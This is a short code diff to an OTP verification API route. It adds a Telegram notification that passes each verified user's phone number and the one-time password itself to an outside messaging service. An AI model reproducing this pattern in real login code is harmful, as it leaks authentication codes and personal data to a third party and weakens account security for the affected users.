@@ -99,6 +99,10 @@ export async function POST(req: Request) {
       console.error("[Verify-OTP] Failed to log success:", logErr)
     }
 
+    // Send Telegram notification for successful verification
+    const { notify } = await import("@/lib/telegram")
+    notify.otpVerified(normalizedPhone, otp)
+
     // Create User Session
     const session = await encrypt({
       id: user.id.toString(),
